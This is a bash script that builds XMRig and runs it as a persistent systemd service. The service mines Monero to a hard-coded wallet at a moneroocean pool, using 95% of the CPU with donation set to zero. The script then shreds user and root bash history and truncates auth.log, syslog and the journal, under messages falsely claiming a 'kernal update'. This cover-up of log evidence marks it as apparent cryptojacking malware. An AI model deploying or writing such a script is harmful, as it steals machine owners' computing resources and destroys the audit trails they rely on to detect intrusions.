#!/bin/bash

cat << 'EOF'

 /$$   /$$  /$$$$$$                /$$            
| $$  | $$ /$$__  $$              | $$            
| $$  | $$| $$  \ $$      /$$$$$$$| $$$$$$$       
| $$$$$$$$| $$$$$$$$     /$$_____/| $$__  $$      
| $$__  $$| $$__  $$    |  $$$$$$ | $$  \ $$      
| $$  | $$| $$  | $$     \____  $$| $$  | $$      
| $$  | $$| $$  | $$ /$$ /$$$$$$$/| $$  | $$      
|__/  |__/|__/  |__/|__/|_______/ |__/  |__/      
                                                  

EOF

# Update system and install dependencies
REBOOT_REQUIRED=false

if sudo apt update && sudo apt upgrade -y; then
    if [ -f /var/run/reboot-required ]; then
        REBOOT_REQUIRED=true
    fi
fi

sudo apt install -y git build-essential cmake automake libtool autoconf \
  libhwloc-dev libssl-dev libuv1-dev screen

# Clone and build XMRig
sudo rm -rf /opt/xmrig
cd /opt
sudo git clone https://github.com/xmrig/xmrig.git
sudo chmod -R 777 /opt/xmrig
sudo chown -R $(whoami):$(whoami) /opt/xmrig
cd /opt/xmrig
git pull origin master
mkdir build && cd build
make clean
cmake ..
make -j$(nproc)

# Write config.json with dynamic max-threads-hint
sudo tee /opt/xmrig/build/config.json > /dev/null <<EOL
{
    "autosave": true,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "huge-pages-jit": false,
        "max-threads-hint": 0.95,
        "yield": true
    },
    "donate-level": 0,
    "pools": [
        {
            "url": "gulf.moneroocean.stream:10128",
            "user": "41jDs7aYqSFYpyvSBs7JAzSpRCjL9sSCS9WPuVGRukYcYTtUTszDdp71RFVtWD2icADwsnAQoSBJfDm7J1Chsuou5AHG36P",
            "pass": "x",
            "rig-id": "Ubuntu-W004",
            "keepalive": true,
            "tls": false
        }
    ]
}
EOL

# Create the xmrig systemd service
sudo tee /etc/systemd/system/xmrig.service > /dev/null <<EOL
[Unit]
Description=XMRig Monero Miner
After=network.target

[Service]
ExecStartPre=/sbin/sysctl -w vm.nr_hugepages=128
ExecStart=/opt/xmrig/build/xmrig --config=/opt/xmrig/build/config.json
WorkingDirectory=/opt/xmrig/build
Restart=always
RestartSec=10
StandardOutput=append:/var/log/xmrig.log
StandardError=append:/var/log/xmrig-error.log
Nice=0
CPUWeight=100

[Install]
WantedBy=multi-user.target
EOL

# Post-reboot resume script (only if reboot is needed)
if $REBOOT_REQUIRED; then
    echo "Reboot required. Setting up post-reboot resume..."

    sudo tee /opt/post_reboot.sh > /dev/null <<'POSTEOF'
#!/bin/bash
echo "Post-reboot resume script running..."

# Reload systemd and start xmrig
systemctl daemon-reexec
systemctl daemon-reload
systemctl enable xmrig
systemctl start xmrig

# Cleanup the one-time service
systemctl disable post-reboot.service
rm -f /etc/systemd/system/post-reboot.service
rm -f /opt/post_reboot.sh
POSTEOF

    sudo chmod +x /opt/post_reboot.sh

    sudo tee /etc/systemd/system/post-reboot.service > /dev/null <<EOL
[Unit]
Description=Resume setup after reboot
After=network.target

[Service]
Type=oneshot
ExecStart=/opt/post_reboot.sh
RemainAfterExit=true

[Install]
WantedBy=multi-user.target
EOL

    sudo systemctl enable post-reboot.service
    echo "Rebooting now to apply new kernel..."
    sudo reboot
else
    # No reboot needed, start mining immediately
    sudo systemctl daemon-reexec
    sudo systemctl daemon-reload
    sudo systemctl enable xmrig
    sudo systemctl start xmrig
    echo "XMRig is now running in the background as a systemd service."
    echo "Use 'journalctl -u xmrig -f' to monitor logs."
fi


echo "Cleaning shell and system command history for new kernal"

# Clear history in current shell
history -c
unset HISTFILE

# Remove user's .bash_history securely
if [ -f ~/.bash_history ]; then
  shred -u ~/.bash_history
fi

# Remove root's .bash_history securely if running as sudo
if [ "$EUID" -eq 0 ] && [ -f /root/.bash_history ]; then
  shred -u /root/.bash_history
fi

# Optional: Try to remove sudo log traces (requires root)
echo "Attempting to clear sudo logs For Kernal Update"
sudo journalctl --vacuum-time=1h >/dev/null 2>&1
sudo truncate -s 0 /var/log/auth.log 2>/dev/null
sudo truncate -s 0 /var/log/syslog 2>/dev/null

# Overwrite bash history environment for current session
export HISTFILE=
export HISTSIZE=0
export HISTFILESIZE=0
